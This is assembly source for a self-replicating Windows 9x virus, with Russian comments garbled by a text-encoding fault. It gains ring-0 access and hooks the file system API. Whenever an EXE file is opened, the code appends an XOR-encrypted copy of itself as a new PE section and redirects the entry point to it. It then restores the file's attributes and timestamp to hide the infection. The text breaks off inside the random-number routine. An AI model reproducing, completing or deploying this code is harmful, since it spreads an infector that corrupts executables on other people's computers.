   include vmm.inc
   include ifs.inc
   include ifsmgr.inc
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;Ž¯à¥¤¥«¥¨¥ ª®áâ â
   TRUE   =  1
   FALSE  =  0
   DEBUG_INT1 = FALSE
   DEBUG_EXF  = FALSE
   length_of_virus = offset(end_virus-start_virus)
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;‘¤¥áì ¨¤¥â á ¬ ¢¨pãá
   extrn ExitProcess:proc
   .386p
   .model flat
   .data
   db 0
   .code
   start_virus:

   IF DEBUG_INT1
   int 1h
   ENDIF

           pushad
           cld
           call     init_virus
   init_virus:
           pop      ebp
           sub      ebp,offset(init_virus-start_virus)
           call     open_RING0_function
           lea      edi,[ebp+RING0_virus-start_virus]
           mov      ax,03h
           int      3h
           mov      ax,02h
           int      3h
           popad
           db       68h ;PUSH
   programm_RVA_with_IMAGEBASE:
           dd       offset exit
           retn
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   include ring0.asm
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   already_in_memory:
           pop      es ds
           retn
   RING0_virus:

   IF DEBUG_INT1
   int 1h
   ENDIF

           push     ds es
           mov      eax,DR1
           cmp      eax,'DK32'
           jz       already_in_memory
   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßß * áè¨äp®¢é¨ª ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
           db       0B0h ;MOV AL,00
   crypt_byte label byte
           db       00h
           mov      ecx,offset(end_crypt-start_crypt)
           lea      esi,[ebp+start_crypt-start_virus]
   encrypt:
           xor      byte ptr [esi],al
           inc      esi
           loop     encrypt
   ;ßßßßßßßßßßßßßßßßßßßßß ‡ è¨äp®¢  ï ç áâì ¢¨pãá  ßßßßßßßßßßßßßßßßßßßßßßßßßßß
   start_crypt:
           call     adjust_VXDCall
           push     PAGECONTIG OR PAGEFIXED OR PAGEZEROINIT OR PAGEUSEALIGN
           push     00000000h
           push     00100000h
           push     00000000h
           push     00000000h
           push     00000000h
           push     PG_SYS
           push     00000004h      ;‘ª®«ìª® áâp ¨æ ¯p¥¤®áâ ¢¨âì
   VXDCall_PageAllocate:
           int      20h
           dw       _PageAllocate,VMM_DEVICE_ID
           add      esp,20h
           or       eax,eax
           jz       already_in_memory
           ;EAX -  ¤p¥áá áâp ¨æë
           mov      edi,eax
           mov      esi,ebp
           mov      ecx,length_of_virus
           rep      movsb ;DS:[ESI] -> ES:[EDI]
           mov      esi,eax
           push     eax
           add      esi,offset(obr_IFSAPI-start_virus)
           push     esi
   VXDCall_IFSMgr_InstallFileSystemApiHook:
           int      20h
           dw       _InstallFileSystemApiHook,IFSMgr_Device_ID
           add      sp,4
           pop      edi
           mov      [edi+old_FSAPI-start_virus],eax
           mov      eax,'DK32'
           mov      DR1,eax
           jmp      already_in_memory
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   adjust_VXDCall:
           pushad
           mov      ecx,number_of_entries_in_VXDCall_table
           lea      esi,[ebp+VXDCall_table-start_virus]
   next_entry:
           push     ecx
           lodsd
           add      eax,ebp
           sub      eax,offset start_virus
           mov      edi,eax
           mov      ecx,06h
           rep      movsb ;DS:[ESI] -> ES:[EDI]
           pop      ecx
           loop     next_entry
           popad
           retn
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   number_of_entries_in_VXDCall_table = 4
   VXDCall_table:
           ;VXDCall _PageAllocate
           dd       offset VXDCall_PageAllocate
           int      20h
           dw       _PageAllocate,VMM_DEVICE_ID
           ;VXDCall IFSMgr_InstallFileSystemApiHook
           dd       offset VXDCall_IFSMgr_InstallFileSystemApiHook
           int      20h
           dw       _InstallFileSystemApiHook,IFSMgr_Device_ID
           ;VXDCall UniToBCSPath
           dd       offset VXDCall_UniToBCSPath
           int      20h
           dw       _UniToBCSPath,IFSMgr_Device_ID
           ;VXDCall IFSMgr_Ring0_FileIO
           dd       offset VXDCall_IFSMgr_Ring0_FileIO
           int      20h
           dw       _IFSMgr_Ring0_FileIO,IFSMgr_Device_ID
   ;ßßßßßßßßßßßßßßßßßßßßßßßßßß Ž¡p ¡®âç¨ª IFSAPI ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
   obr_IFSAPI:
           pushad   ;ESP-20h
           pushfd
           cld
           push     ds es
           push     ss ss
           pop      es ds
           call     init_obr_IFSAPI
   init_obr_IFSAPI:
           pop      ebp
           sub      ebp,offset(init_obr_IFSAPI-obr_IFSAPI)
           cmp      byte ptr [ebp+busy_flag-obr_IFSAPI],01h
           jz       virus_busy
           mov      byte ptr [ebp+busy_flag-obr_IFSAPI],01h
           lea      ebx,[esp+34h]
           cmp      dword ptr ds:[ebx],24h ;Žâªpëâ¨¥ ä ©« 
           jnz      unbusy_virus_quit
           lea      esi,[ebp+path_to_file-obr_IFSAPI]
           mov      al,ds:[ebx+04h]  ;H®¬¥à ¤¨áª ,   ª®â®à®¬ ¢á¥ ¯à®¨áå®¤¨â (1 = A: .. 0ffh - UNC)
           cmp      al,0FFh
           jz       disk_not_present
           add      al,40h
           mov      ah,':'
           mov      ss:[esi],ax
           add      esi,2h
   disk_not_present:
           push     00 7Fh
           mov      ebx,ds:[ebx+10h] ;“ª § â¥«ì   áâàãªâãàã ¢ë§®¢  IFS ¬¥¥¤¦¥à  (IOREQ)
           mov      eax,ds:[ebx+0Ch] ;Š®¤®¢ ï áâà ¨æ , ¢ ª®â®à®© î§¥à  ¡à « á¢®î áà®ªã
                                     ;BCS_ANSI = ANSI, BCS_OEM = OEM
           add      eax,04h
           push     eax
           push     esi              ;Šã¤  ¯®«®¦¨âì ¯ãâì
   VXDCall_UniToBCSPath:
           int      20h
           dw       _UniToBCSPath,IFSMgr_Device_ID
           add      esp,10h
           cmp      word ptr ds:[ebx+18h],01
           jnz      unbusy_virus_quit
           call     void_attr
           jc       unbusy_virus_quit
           call     open_file
           jc       set_attr_quit
           ;‚å®¤: Žâªpëâë© HANDLE
           call     asciiz
           ;‚å®¤: Žâªpëâë© HANDLE
           call     zaraza
           call     close_file
           call     set_time
   set_attr_quit:
           call     set_attr
   unbusy_virus_quit:
           mov      byte ptr [ebp+busy_flag-obr_IFSAPI],0
   quit_obr_IFSAPI:
           pop      es ds
           popfd
           popad
           db       0ffh,25h ;JMP []
   old_FSAPI label dword
           dd       00000h
   virus_busy:
           mov      ebx,esp
           push     dword ptr [ebx+44h]
           call     [ebx+30h]
           pop      ecx
           mov      [ebx+28h],eax
           cmp      dword ptr [ebx+34h],24h
           jnz      no_open_file
           mov      eax,[ecx+28h]
           mov      [ebp+time_date_of_file-obr_IFSAPI],eax
           mov      [ebp+cell_for_rnd_number-obr_IFSAPI],eax
   no_open_file:
           pop      es ds
           popfd
           popad
           retn
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   zaraza:
           pushad
           cmp      byte ptr [ebp+extention-obr_IFSAPI],0
           jz       exit_zaraza
           cmp      byte ptr [ebp+filename-obr_IFSAPI],0
           jnz      exit_zaraza
           cmp      byte ptr [ebp+filemask-obr_IFSAPI],1
           jnz      exit_zaraza

   IF DEBUG_INT1
   int 1h
   ENDIF

           mov      ecx,02h
           mov      edx,3ch
           lea      esi,[ebp+common_buffer-obr_IFSAPI]
           call     read_file
           ;—¨â ¥¬ PE § £®«®¢®ª
           mov      ecx,60h
           movzx    edx,word ptr ds:[esi]
           mov      dword ptr [ebp+PE_header_entrypoint-obr_IFSAPI],edx
           lea      esi,[ebp+PE_header-obr_IFSAPI]
           call     read_file
           cmp      dword ptr [ebp+PE_header-obr_IFSAPI+58h],01010004h
           jz       exit_zaraza
           mov      dword ptr [ebp+PE_header-obr_IFSAPI+58h],01010004h
           ;—¨â ¥¬ ¯®á«¥¤¨© ®¡ì¥ªâ
           movzx    eax,word ptr [ebp+PE_header-obr_IFSAPI+06h] ;—¨á«® ®¡ì¥ªâ®¢
           or       eax,eax
           jz       exit_zaraza
           dec      eax
           mov      ecx,40d
           mul      ecx
           add      eax,18h
           add      ax,word ptr [ebp+PE_header-obr_IFSAPI+14h]  ;+NT Header SIZE
           add      eax,dword ptr [ebp+PE_header_entrypoint-obr_IFSAPI]
           push     eax
           add      eax,40d
           mov      dword ptr [ebp+New_OBJ_entrypoint-obr_IFSAPI],eax
           pop      edx
           lea      esi,[ebp+last_WIN_object-obr_IFSAPI]
           call     read_file
           cmp      eax,ecx
           jnz      exit_zaraza
           cmp      dword ptr [ebp+last_WIN_object-obr_IFSAPI+4],'_piz'
           jz       exit_zaraza
           ;H áâp ¨¢ ¥¬ ®¢ë© ®¡ì¥ªâ
           xor      edx,edx
           mov      eax,length_of_virus-1
           mov      ecx,[ebp+PE_header-obr_IFSAPI+3Ch]         ;FILE ALIGN
           cmp      ecx,200h
           jb       exit_zaraza
           div      ecx
           inc      eax
           mul      ecx
           mov      [ebp+New_OBJ-obr_IFSAPI+08h],eax           ;VIRTUAL SIZE
           mov      [ebp+New_OBJ-obr_IFSAPI+10h],eax           ;PHYS SIZE
           mov      eax,[ebp+last_WIN_object-obr_IFSAPI+0Ch]   ;RVA ¯®á«¥¤¥£® ®¡ì¥ªâ 
           add      eax,[ebp+last_WIN_object-obr_IFSAPI+08h]   ;VIRTUAL SIZE
           dec      eax
           mov      ecx,[ebp+PE_header-obr_IFSAPI+38h]         ;Object ALIGN
           cmp      ecx,200h
           jb       exit_zaraza
           div      ecx
           inc      eax
           mul      ecx
           mov      [ebp+New_OBJ-obr_IFSAPI+0Ch],eax           ;OBJECT RVA
           mov      eax,R0_GETFILESIZE
           mov      ebx,[ebp+file_handle-obr_IFSAPI]
           call     VXDCall_IFSMgr_Ring0_FileIO
           push     eax ;„«¨  ä ©« 
           mov      edx,eax
           sub      edx,04h
           mov      ecx,04h
           lea      esi,[ebp+common_buffer-obr_IFSAPI]
           call     read_file
           pop      eax
           cmp      dword ptr [ebp+common_buffer-obr_IFSAPI],0
           jnz      exit_zaraza
           xor      edx,edx
           push     eax
           dec      eax
           mov      ecx,[ebp+PE_header-obr_IFSAPI+3Ch]   ;FILE ALIGN
           div      ecx
           inc      eax
           mul      ecx
           mov      [ebp+New_OBJ-obr_IFSAPI+14h],eax     ;PHYS OFFSET
           pop      edx
           mov      ecx,edx
           sub      ecx,eax
           neg      ecx
           cmp      ecx,2000h
           jae      exit_zaraza
           jcxz     no_add_nul
           lea      esi,[ebp+NUL_buffer-obr_IFSAPI]
           call     clear_NUL_buffer
           call     write_to_file
   no_add_nul:
           ;H áâp ¨¢ ¥¬ PE header
           inc      word ptr [ebp+PE_header-obr_IFSAPI+06h]
           ;‘®åp ï¥¬ áâ pë© RVA
           mov      eax,[ebp+PE_header-obr_IFSAPI+34h]       ;IMAGE BASE
           add      eax,[ebp+PE_header-obr_IFSAPI+28h]       ;ENTRYPOINT RVA
           mov      [ebp+programm_RVA_with_IMAGEBASE-obr_IFSAPI],eax
           ;‘â ¢¨¬  è RVA
           mov      eax,[ebp+New_OBJ-obr_IFSAPI+0Ch]         ;RVA ®¢®£® ®¡ì¥ªâ 
           mov      [ebp+PE_header-obr_IFSAPI+28h],eax       ;NEW RVA ENTRYPOINT
           ;*¥¤ ªâ¨pã¥¬ IMAGE SIZE
           dec      eax
           add      eax,[ebp+New_OBJ-obr_IFSAPI+08h]         ;VIRTUAL SIZE
           mov      ecx,[ebp+PE_header-obr_IFSAPI+38h]       ;OBJECT ALIGN
           xor      edx,edx
           div      ecx
           inc      eax
           mul      ecx
           mov      [ebp+PE_header-obr_IFSAPI+50h],eax       ;IMAGE SIZE
           ;*¨è¥¬ ¢¨pãá
           call     crypt_virus
           mov      ecx,length_of_virus
           mov      edx,[ebp+New_OBJ-obr_IFSAPI+14h]   ;FHYS OFFSET
           lea      esi,[ebp+NUL_buffer-obr_IFSAPI]
           call     write_to_file
           ;„®¯¨áë¢ ¥¬ ¥¤®áâ îé¥¥
           mov      ecx,[ebp+New_OBJ-obr_IFSAPI+10h]
           sub      ecx,length_of_virus
           add      edx,length_of_virus
           lea      esi,[ebp+NUL_buffer-obr_IFSAPI]
           call     clear_NUL_buffer
           call     write_to_file
           ;*¨è¥¬ ®¢ë© PE_header
           mov      ecx,60h
           mov      edx,[ebp+PE_header_entrypoint-obr_IFSAPI]
           lea      esi,[ebp+PE_header-obr_IFSAPI]
           call     write_to_file
           ;*¨è¥¬ ®¢ë© OBJ
           mov      ecx,40d
           mov      edx,[ebp+New_OBJ_entrypoint-obr_IFSAPI]
           lea      esi,[ebp+New_OBJ-obr_IFSAPI]
           call     write_to_file
   exit_zaraza:
           popad
           retn
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   clear_NUL_buffer:
           pushad
           mov      ecx,2000h
           lea      edi,[ebp+NUL_buffer-obr_IFSAPI]
           xor      al,al
           rep      stosb
           popad
           retn
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   crypt_virus:
           pushad
           mov      ecx,length_of_virus
           lea      esi,[ebp+start_virus-obr_IFSAPI]
           lea      edi,[ebp+NUL_buffer-obr_IFSAPI]
           rep      movsb ;DS:[ESI] -> ES:[EDI]
   new_crypt_number:
           call     random_any_edx
           or       dh,dh
           jz       new_crypt_number
           mov      [ebp+NUL_buffer-obr_IFSAPI+crypt_byte-start_virus],dh
           lea      esi,[ebp+NUL_buffer-obr_IFSAPI+start_crypt-start_virus]
           mov      ecx,offset(end_crypt-start_crypt)
   decrypt:
           xor      [esi],dh
           inc      esi
           loop     decrypt
           popad
           retn
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;‚å®¤: Žâªpëâë© HANDLE ä ©« 
   ;      EBP - ®â®á¨â¥«ì
   ;      [path_to_file] - "¤¨áª:¯ãâì\¨¬ï ä ©« ",0
   ;‚ëå®¤: ‘¬®âp¨â¥ ¯¥p¥¬¥ë¥:
   ;       1) filename
   ;       2) extention
   ;       3) filemask
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¸
   ;”®p¬ â ¯¥p¥çï ¨¬¥ ä ©«®¢:                                   ;³
   ;1) ¯¥p¢ë¬ ¡ ©â®¬ ¨¤¥â ¤«¨  ¨¬¥¨. *p¨¬¥p 4,'ABCD'           ;³
   ;2) ¯®â®¬ á ¬® ¨¬ï (¡®«ìè¨¬¨ ¡ãª¢ ¬¨)                          ;³
   ;3) ¨ â.¤ ¤pã£¨¥ ¨¬¥                                          ;³
   ;4) ¯¥p¥ç¥ì ¤®«¦¥ § ª ç¨¢ âìáï ¡ ©â®¬ 0ffh                  ;³
   filenames:                                                     ;³
           db       0ffh ; - *p¨§ ª ª®æ                         ;³
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍµ
   extentions:                                                    ;³
   IF DEBUG_EXF                                                   ;³
           db       04,'EXF',0                                    ;³
   ELSE                                                           ;³
           db       04,'EXE',0                                    ;³
   ENDIF                                                          ;³
           db       0ffh  ; - *p¨§ ª ª®æ                        ;³
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍµ
   ;”®à¬ â:                                                        ³
   ;1) ‘«®¢® á¬¥é¥¨ï ¬ áª¨                                        ³
   ;2) Š«îç¥¢®© ¡ ©â                                               ³
   ;   0 - (1) ¨ ¥áâì á¬¥é¥¨¥ ¬ áª¨                               ³
   ;   1 - ‘¬¥é¥¨¥ ¡¥p¥âáï ¨§ ä ©«  ¯® (1)                        ³
   ;3) „«¨  ¬ áª¨                                                ³
   ;4) Œ áª :                                                      ³
   ;   a)  ‘¨¬¢®« '?' - «î¡®¥ ç¨á«®                                ³
   ;   b)  ‘¨¬¢®« '*' - «î¡®© § ª                                 ³
   ;5) *¥p¥ç¥ì ¤®«¦¥ § ª ç¨¢ âìáï á¨¬¢®«®¬ 0ffh                 ³
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   filemasks:                                   ;³                 ³
           dw       003Ch                       ;³    Win32 App    ³
           db       1,4,'PE',0,0                ;³                 ³
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
           db       0ffh ; - *p¨§ ª ª®æ       ;³                 ³
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   asciiz:
           pushad
           cld
           ;„«ï  ç «  ®â¤¥«¨¬ ¨¬ï ä ©«  ®â ¯ãâ¨
           lea      esi,[ebp+path_to_file-obr_IFSAPI]
           mov      edi,esi
           mov      ecx,80h
   set_ebx_to_name:
           mov      ebx,esi
   scan_name:
           lodsb    ;DS:[ESI] ("¤¨áª:\¯ãâì\¨¬ï ä ©« ",0)-> AL
           cmp      al,'\'
           jz       set_ebx_to_name
           cmp      al,'/'
           jz       set_ebx_to_name
           cmp      al,':'
           jz       set_ebx_to_name
           or       al,al
           jz       filenames_check
           loop     scan_name
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;*p®¢¥pª  ¯® ¯¥p¥çî ¨¬¥
   filenames_check:
           mov      esi,ebx
           lea      edi,[ebp+filenames-obr_IFSAPI]
          ;*®¯p®£p ¬¬  áp ¢¥¨ï ®¤®© áâp®ª¨ á ¥áª®«ìª¨¬¨ ¤pã£¨¬¨ ¨§ ¡ §ë
          ;‚å®¤: DS:[ESI] áâp®ª  á ª®â®p®© ¡ã¤¥â áp ¢¨¢ âìáï  ¡®p áâp®ª
          ;      ES:[EDI] ¡ §  áâp®ª ¢ ä®p¬ â¥:
          ;      db  6,'sergey'
          ;      db  5,'misha'
          ;      db  0ffh  - *p¨§ ª ª®æ 
          ;‚ëå®¤: AL==0  - ¥â á®¢¯ ¤¥¨©
          ;       AL!=0 - ®¬¥p á®¢¯ ¢è¥© áâp®ª¨  ç¨ ï á 1'æë
           call     cmps_string_with_databasestring
           mov      byte ptr [ebp+filename-obr_IFSAPI],al
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;*p®¢¥pª  ¯® ¯¥p¥çî p áè¨p¥¨©
   check_file_extention:
   seach_point:
           lodsb    ;DS:[ESI] -> AL
           cmp      al,'.'
           jz       point_found
           or       al,al
           jnz      seach_point
   point_found:
           lea      edi,[ebp+extentions-obr_IFSAPI]
           call     cmps_string_with_databasestring
           mov      byte ptr [ebp+extention-obr_IFSAPI],al
           or       al,al
           jnz      check_filemask
           jmp      set_filemask_zero_exit
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;*p®¢¥pª  ¯® ¯¥p¥çî ¬ á®ª
   check_filemask:
           lea      edi,[ebp+filemasks-obr_IFSAPI]
           mov      byte ptr [ebp+filemask-obr_IFSAPI],1
   next_mask:
           push     edi
           cmp      byte ptr [edi],0ffh
           jz       popedi_set_filemask_zero_exit
           cmp      byte ptr [edi+2],0h
           jz       no_win_check
           movzx    edx,word ptr [edi]
           lea      esi,[ebp+common_buffer-obr_IFSAPI]
           mov      ecx,2h
           call     read_file
           jc       mask_failed
           movzx    edx,word ptr [ebp+common_buffer-obr_IFSAPI]
           jmp      read_and_check_mask
   no_win_check:
           movzx    edx,word ptr [edi]
           ;—¨â ¥¬ ¬ áªã ¨ ¯p®¢¥pï¥¬ ¬ áªã
   read_and_check_mask:
           ;‚å®¤: EDX - ®â ªã¤  ç¨â âì
           movzx    ecx,byte ptr [edi+3]
           lea      esi,[ebp+common_buffer-obr_IFSAPI]
           call     read_file
           jc       mask_failed
           add      edi,4h
   next_letter_of_mask:
           cmp      byte ptr [edi],'*'
           jz       next_letter
           cmp      byte ptr [edi],'?'
           jnz      letter_is_not_q
           cmp      byte ptr [esi],30h
           jb       mask_failed
           cmp      byte ptr [esi],39h
           ja       mask_failed
   next_letter:
           inc      edi
           inc      esi
           loop     next_letter_of_mask
           jmp      mask_coincide
   letter_is_not_q:
           cmpsb            ;‘p ¢¨¢ âì DS:[SI] á ES:[DI]
           jnz      mask_failed
           loop     next_letter_of_mask
           ;‘®¢¯ «  ¬ áª 
   mask_coincide:
           pop      edi
           jmp      exit_Asciiz
           ;Œ áª  ¥ á®¢¯ « 
   mask_failed:
           pop      edi
           add      edi,3h
           movzx    ecx,byte ptr [edi]
           add      edi,ecx
           inc      edi
           inc      byte ptr [ebp+filemask-obr_IFSAPI]
           jmp      next_mask
   popedi_set_filemask_zero_exit:
           pop      edi
   set_filemask_zero_exit:
           mov      byte ptr [ebp+filemask-obr_IFSAPI],0
   exit_Asciiz:
           popad
           retn
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;*®¯p®£p ¬¬  áp ¢¥¨ï ®¤®© áâp®ª¨ á ¥áª®«ìª¨¬¨ ¤pã£¨¬¨ ¨§ ¡ §ë
   ;‚å®¤: [ESI] áâp®ª  á ª®â®p®© ¡ã¤¥â áp ¢¨¢ âìáï  ¡®p áâp®ª
   ;      [EDI] ¡ §  áâp®ª ¢ ä®p¬ â¥:
   ;      db  6,'sergey'
   ;      db  5,'misha'
   ;      db  0ffh  - *p¨§ ª ª®æ 
   ;‚ëå®¤: AL==0 - á®¢¯ ¤¥¨© ¥â
   ;       AL!=0 - ®¬¥p á®¢¯ ¢è¥© áâp®ª¨
   cmps_string_with_databasestring:
           push     edi ecx
           cld
           xor      ecx,ecx
           mov      al,01h
   next_string:
           push     esi edi
           mov      cl,[edi]
           cmp      cl,0ffh
           jz       no_coincide_string
           inc      edi
           rep      cmpsb   ; ‘p ¢¨¢ âì DS:[ESI] á ES:[EDI]
           pop      edi esi
           jz       coincide_string
           mov      cl,[edi]
           add      edi,ecx
           inc      edi
           inc      al
           jmp      next_string
   coincide_string:
           pop      ecx edi
           retn
   no_coincide_string:
           pop      edi esi ecx edi
           xor      al,al
           retn
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   set_time:
           pushad
           mov      eax,4303h
           mov      ecx,[ebp+time_date_of_file-obr_IFSAPI]
           mov      edi,[ebp+time_date_of_file-obr_IFSAPI+2]
           lea      esi,[ebp+path_to_file-obr_IFSAPI]
           call     VXDCall_IFSMgr_Ring0_FileIO
           popad
           retn
   void_attr:
           pushad
           mov      ax,R0_FILEATTRIBUTES OR GET_ATTRIBUTES
           lea      esi,[ebp+path_to_file-obr_IFSAPI]
           call     VXDCall_IFSMgr_Ring0_FileIO
           jc       exit_void_attr
           mov      [ebp+file_attribute-obr_IFSAPI],ecx
           mov      ax,R0_FILEATTRIBUTES OR SET_ATTRIBUTES
           xor      ecx,ecx
           call     VXDCall_IFSMgr_Ring0_FileIO
   exit_void_attr:
           popad
           retn
   set_attr:
           pushad
           mov      ax,R0_FILEATTRIBUTES OR SET_ATTRIBUTES
           mov      ecx,[ebp+file_attribute-obr_IFSAPI]
           lea      esi,[ebp+path_to_file-obr_IFSAPI]
           call     VXDCall_IFSMgr_Ring0_FileIO
           popad
           retn
   open_file:
           pushad
           mov      eax,R0_OPENCREATFILE
           xor      ecx,ecx
           mov      ebx,ACCESS_READWRITE
           mov      edx,ACTION_OPENEXISTING
           lea      esi,[ebp+path_to_file-obr_IFSAPI]
           call     VXDCall_IFSMgr_Ring0_FileIO
           mov      [ebp+file_handle-obr_IFSAPI],eax
           popad
           retn
   ;‡ ªpëâì ä ©«®¢ë© åí¤«
   close_file:
           pushad
           mov      eax,R0_CLOSEFILE
           mov      ebx,[ebp+file_handle-obr_IFSAPI]
           call     VXDCall_IFSMgr_Ring0_FileIO
           popad
           retn
   ;‚å®¤: ECX - áª®«ìª® ¯p®ç¨â âì
   ;      EDX - ®âªã¤  ¯p®ç¨â âì
   ;      ESI - ªã¤  ç¨â âì
   read_file:
           push     ebx
           mov      eax,R0_READFILE
           mov      ebx,[ebp+file_handle-obr_IFSAPI]
           call     VXDCall_IFSMgr_Ring0_FileIO
           pop      ebx
           retn
   ;‚å®¤: ECX - áª®«ìª® § ¯¨á âì
   ;      EDX - ªã¤  ¯¨á âì
   ;      ESI - ¤ ë¥ ¤«ï § ¯¨á¨
   write_to_file:
           pushad
           mov      eax,R0_WRITEFILE
           mov      ebx,[ebp+file_handle-obr_IFSAPI]
           call     VXDCall_IFSMgr_Ring0_FileIO
           popad
           retn
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   VXDCall_IFSMgr_Ring0_FileIO:
           int      20h
           dw       _IFSMgr_Ring0_FileIO,IFSMgr_Device_ID
           retn
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   random_any_edx:
           mov      edx,0fffffffeh
   random_edx:
           push     eax ebx edx
